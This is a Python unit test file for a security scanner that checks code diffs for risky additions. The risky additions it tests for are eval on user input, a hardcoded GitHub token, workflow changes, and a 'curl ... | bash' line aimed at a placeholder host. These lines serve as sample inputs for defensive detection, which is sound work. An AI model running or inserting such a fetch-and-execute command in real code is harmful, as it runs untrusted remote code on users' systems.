import unittest

from security_audit_worker.rules import MAX_DIFF_CHARS, scan_diff


def diff_for(path: str, added: list[str]) -> str:
    lines = [f"diff --git a/{path} b/{path}", f"--- a/{path}", f"+++ b/{path}", "@@ -1,1 +1,1 @@"]
    lines.extend(f"+{line}" for line in added)
    return "\n".join(lines) + "\n"


class ScanDiffTests(unittest.TestCase):
    def test_clean_diff_has_no_findings(self):
        diff = diff_for("crates/x/src/lib.rs", ["    let total = items.iter().sum::<u32>();"])
        self.assertEqual(scan_diff(diff), [])

    def test_flags_eval_in_added_line(self):
        findings = scan_diff(diff_for("scripts/run.py", ["result = eval(user_input)"]))
        self.assertTrue(any(f.rule_id == "python-eval-exec" for f in findings))

    def test_ignores_removed_lines(self):
        diff = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1,1 +1,1 @@\n-eval(input())\n+print(1)\n"
        self.assertEqual(scan_diff(diff), [])

    def test_flags_hardcoded_github_pat(self):
        token = "ghp_" + "A1" * 18
        findings = scan_diff(diff_for("config.py", [f'TOKEN = "{token}"']))
        self.assertTrue(any(f.rule_id == "github-pat" for f in findings))

    def test_flags_github_actions_workflow_change(self):
        findings = scan_diff(diff_for(".github/workflows/ci.yml", ["  push: branches: [main]"]))
        self.assertTrue(any(f.rule_id == "github-actions-change" for f in findings))

    def test_flags_curl_pipe_sh(self):
        findings = scan_diff(diff_for("install.sh", ["curl https://example.invalid/x.sh | bash"]))
        self.assertTrue(any(f.rule_id == "shell-pipe-to-interpreter" for f in findings))

    def test_oversized_diff_is_rejected(self):
        with self.assertRaises(ValueError):
            scan_diff("+" + "x" * MAX_DIFF_CHARS)

    def test_deleted_file_lines_are_ignored(self):
        diff = "diff --git a/old.py b/old.py\n--- a/old.py\n+++ /dev/null\n@@ -1,1 +0,0 @@\n-eval(input())\n"
        self.assertEqual(scan_diff(diff), [])


if __name__ == "__main__":
    unittest.main()
